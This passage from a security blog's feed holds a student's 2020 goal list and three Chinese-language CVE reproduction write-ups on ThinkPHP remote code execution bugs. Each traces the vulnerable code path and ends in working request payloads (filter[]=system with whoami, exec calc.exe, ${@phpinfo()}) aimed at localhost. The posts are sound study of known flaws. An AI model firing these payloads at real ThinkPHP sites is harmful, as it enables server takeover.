        <content type="html"><![CDATA[<h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p><h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p><p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p><p>我想要变得更加优秀,我想活出自己</p><h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>目标是清晰明确的,量化的</li><li>目标难度要适合,不能太简单也不能不可实现</li><li>如果无法确定今年的目标,那就确定这个月的吧</li><li>根据实际情况对目标进行调整</li><li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li></ol><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol><li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li><li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li><li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li><li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li><li>小目标永远是为大目标/梦想/想法服务的</li></ol><h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol><li>分解细致，能力可达，留有余地</li><li>奖惩并行</li><li>每个星期总结一次,计划是否合理</li></ol><h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol><li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li><li>身体健康,三观尚在 </li><li>开发一个类似hexo的python程序</li><li>进入补天前1000名（✔）</li></ol><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p><ol><li>每专注于目标2个小时就可以任意支配1个小时的时间</li><li>专注过程中跑去玩,从头来过,计时清零</li><li>没有认真执行,销毁这份计划</li></ol><h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p><ul><li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li><li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li><li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li><li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(3/3)</li></ul><h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p><ul><li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li><li><input disabled="" type="checkbox"> 看完一本书(未定)</li><li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li><li><input disabled="" type="checkbox"> buuoj40题(8/40)</li><li><input disabled="" type="checkbox"> 再挖出20个库币</li></ul><h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul><li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li><li><input checked="" disabled="" type="checkbox"> 看完一本书(明朝那些事)</li><li><input disabled="" type="checkbox"> buuoj50题(30/50)</li><li><input disabled="" type="checkbox"> 挖20个库币(5/20)不是我不努力，一堆重复。。</li><li><input disabled="" type="checkbox"> 我的世界写一个mod</li></ul><h3 id="5月份"><a href="#5月份" class="headerlink" title="5月份"></a>5月份</h3><ul><li><input checked="" disabled="" type="checkbox"> 看完一本书（明朝那些事二）</li><li><input disabled="" type="checkbox"> ctf题目50题(14/50)</li><li><input checked="" disabled="" type="checkbox"> 补天30个库币(150/30)</li><li><input disabled="" type="checkbox"> 渗透靶场3个(0/3)</li><li><input disabled="" type="checkbox"> 每天学习8小时以上(20/30)</li></ul><h3 id="6月份"><a href="#6月份" class="headerlink" title="6月份"></a>6月份</h3><ul><li><input checked="" disabled="" type="checkbox"> 至少阅读一本书</li><li><input disabled="" type="checkbox"> 发现有趣的东西</li><li><input checked="" disabled="" type="checkbox"> 尝试补天公测，快乐就好</li><li><input disabled="" type="checkbox"> 渗透靶场玩玩</li><li><input disabled="" type="checkbox"> xctf,rctf …历届题目复现</li></ul><h3 id="7月份"><a href="#7月份" class="headerlink" title="7月份"></a>7月份</h3><ul><li><input disabled="" type="checkbox"> 把<a href="https://portswigger.net/web-security" target="_blank" rel="noopener">burp</a> 里不太会的学完</li><li><input checked="" disabled="" type="checkbox"> 明朝那些事+ctf特训营web部分</li><li><input disabled="" type="checkbox"> 3个靶机，不要看wp，如果看了一定要把不会的内容系统学习，并重新做一遍</li><li><input disabled="" type="checkbox"> ctf 10 道好题</li><li><input checked="" disabled="" type="checkbox"> 编写新的url资产采集工具</li></ul><h3 id="10月份"><a href="#10月份" class="headerlink" title="10月份"></a>10月份</h3><ul><li><input checked="" disabled="" type="checkbox"> 内网渗透学习，完成htb3个靶场</li><li><input disabled="" type="checkbox"> 看完面向对象设计</li><li><input checked="" disabled="" type="checkbox"> 字节SRC尝试挖一个洞拿个衬衫</li></ul><h3 id="11月份"><a href="#11月份" class="headerlink" title="11月份"></a>11月份</h3><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p><h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p><p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p><p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p><h3 id="4月份-1"><a href="#4月份-1" class="headerlink" title="4月份"></a>4月份</h3><p>总的来说还是偶尔摸鱼偶尔努力，没有目标，该为未来的工作努力下了。4月和学长一起开发了一个自动漏扫工具感觉还不错。5月份自律下吧，毕竟以前我还是挺自律的。4月份的目标没有全部完成，完成一半大概还是有的。果然反思还是要有点切入点的，不然不知道在写啥。</p><h3 id="5月份-1"><a href="#5月份-1" class="headerlink" title="5月份"></a>5月份</h3><p>4月份写的脚本真的很给力，一下挖了很多洞，就是太费时了。。基本上半个月每天4个小时都在挖洞。。。其实整个在家的期间都没有动力，始终都是做着一些重复的劳动，倒没有去学习。希望自己能够因为兴趣而研究，学习。就这样</p><h3 id="6月份-1"><a href="#6月份-1" class="headerlink" title="6月份"></a>6月份</h3><p>没有强制任务就开始水了，看来还是得定量一些任务的。其实我一直摸鱼的原因有一部分是因为长时间摸鱼，然后对于进行那些劳累自己心智的任务会有抗拒，有时候逼一下自己就好了。7月份要记录每天所作的事情</p><h3 id="年度总结"><a href="#年度总结" class="headerlink" title="年度总结"></a>年度总结</h3><p>2020年过去了，这份计划也是做一会停一会，奖惩制度也没有认真执行，虽然有着不错的开头，但是在过程中夭折，或许我应该在能看到的地方时刻提醒自己？</p><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p><p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/01/31/我的2020/">https://www.ccreater.top/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.x任意代码执行漏洞</title>
      <link href="2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p><p>官网的thinkphp 2.2已经修复了</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p><p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p><p>路由解析处</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p><blockquote><p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p><p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p><pre><code>/foo bar/#^[^0-9]$#+php+%[a-zA-Z0-9_-]%</code></pre></blockquote><p>替换常量,这个就变成了</p><p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p><p>查看preg_replace的介绍发现</p><blockquote><p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p></blockquote><p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p><p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p><p>构造</p><pre><code class="php">$paths=array(    &#39;xxxx&#39;,    &#39;${phpinfo()}&#39;);</code></pre><p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p><p>从而导致命令执行</p><p>于是构造payload</p><p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p><p>用单引号来包围所有引用就可以避免命令执行</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</title>
      <link href="2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p><p>测试环境 5.1.29</p><p><strong>入口处关闭报错</strong> </p><p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p><p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p><p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p><p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p><p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p><p>我们从<code>Request::param</code>处开始分析</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (!$this-&gt;mergeParam) {            $method = $this-&gt;method(true);            // 自动获取请求变量            switch ($method) {                case &#39;POST&#39;:                    $vars = $this-&gt;post(false);                    break;                case &#39;PUT&#39;:                case &#39;DELETE&#39;:                case &#39;PATCH&#39;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            }            // 当前请求参数和URL地址中的参数合并            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...    }</code></pre><p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p><pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;post)) {            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);        }        return $this-&gt;input($this-&gt;post, $name, $default, $filter);    }</code></pre><p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p><p>跟进<code>Request::input</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }       ...    }</code></pre><p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p><p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p><p>跟进去</p><pre><code class="php">private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // 正则过滤                    if (!preg_match($filter, $value)) {                        // 匹配不成功返回默认值                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filter函数不存在时, 则使用filter_var进行过滤                    // filter为非整形值时, 调用filter_id取得过滤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }</code></pre><p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p><p>且<code>$filter</code>=<code>$_POST</code></p><p>因此有</p><pre><code>http://127.0.0.1/public/POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</title>
      <link href="2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captchapost_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamipost_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p><p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p><p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p><p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p><p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p><pre><code class="php">protected function __construct($options = [])    {        foreach ($options as $name =&gt; $item) {            if (property_exists($this, $name)) {                $this-&gt;$name = $item;            }        }        if (is_null($this-&gt;filter)) {            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        }        // 保存 php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    }</code></pre><p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//命令执行            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }        ...    }</code></pre><p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p><p>接着查找调用method()的地方,下断点</p><p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p><p>从入口点App.php开始查看可能作为攻击链一部分的地方</p><p>节选App.php关键内容</p><pre><code class="php">public static function run(Request $request = null)    {        $request = is_null($request) ? Request::instance() : $request;        try {            ...            // 获取应用调度信息            $dispatch = self::$dispatch;            // 未设置调度信息则进行 URL 路由检测            if (empty($dispatch)) {                $dispatch = self::routeCheck($request, $config);            }            // 记录当前调度信息            $request-&gt;dispatch($dispatch);            // 记录路由和请求信息            ...            $data = self::exec($dispatch, $config);        } catch (HttpResponseException $exception) {            $data = $exception-&gt;getResponse();        }        ...    }</code></pre><p>跟进routeCheck</p><pre><code class="php">public static function routeCheck($request, array $config)    {        $path   = $request-&gt;path();        $depr   = $config[&#39;pathinfo_depr&#39;];        $result = false;        // 路由检测        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];        if ($check) {            ...            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);            ...        }        ...        return $result;    }</code></pre><p>跟进check,在获取method时调用了method方法</p><pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        //检查解析缓存        ...        $method = strtolower($request-&gt;method());        // 获取当前请求类型的路由规则       ...    }</code></pre><p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p><p>跟进exec瞧一瞧</p><pre><code class="php">protected static function exec($dispatch, $config)    {        switch ($dispatch[&#39;type&#39;]) {            case &#39;redirect&#39;: // 重定向跳转                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)                    -&gt;code($dispatch[&#39;status&#39;]);                break;            case &#39;module&#39;: // 模块/控制器/操作                $data = self::module(                    $dispatch[&#39;module&#39;],                    $config,                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null                );                break;            case &#39;controller&#39;: // 执行控制器操作                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = Loader::action(                    $dispatch[&#39;controller&#39;],                    $vars,                    $config[&#39;url_controller_layer&#39;],                    $config[&#39;controller_suffix&#39;]                );                break;            case &#39;method&#39;: // 回调方法                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);                break;            case &#39;function&#39;: // 闭包                $data = self::invokeFunction($dispatch[&#39;function&#39;]);                break;            case &#39;response&#39;: // Response 实例                $data = $dispatch[&#39;response&#39;];                break;            default:                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);        }        return $data;    }</code></pre><p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>时会调用<code>Request::instance()-&gt;param()</code></p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // 自动获取请求变量            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p><p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p><p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p><p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p><p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p><p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p><blockquote><p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p></blockquote><p>于是最后的payload是</p><pre><code>http://127.0.0.1/index.php?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p><p>我们看到<code>Request::param</code>方法</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // 自动获取请求变量            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>注意这一个<code>$this-&gt;method(true);</code></p><p><code>Request::method</code></p><pre><code class="php">    public function method($method = false)    {        if (true === $method) {            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }         ...    }</code></pre><p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p><pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;server)) {            $this-&gt;server = $_SERVER;        }        if (is_array($name)) {            return $this-&gt;server = array_merge($this-&gt;server, $name);        }        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);    }</code></pre><p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (&#39;&#39; != $name) {            // 解析name            if (strpos($name, &#39;/&#39;)) {                list($name, $type) = explode(&#39;/&#39;, $name);            } else {                $type = &#39;s&#39;;            }            // 按.拆分成多维数组进行判断            foreach (explode(&#39;.&#39;, $name) as $val) {                if (isset($data[$val])) {                    $data = $data[$val];                } else {                    // 无输入数据，返回默认值                    return $default;                }            }            if (is_object($data)) {                return $data;            }        }        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        ...        return $data;    }</code></pre><p>于是有</p><pre><code class="php">http://127.0.0.1/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p><p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE 漏洞复现/](<a 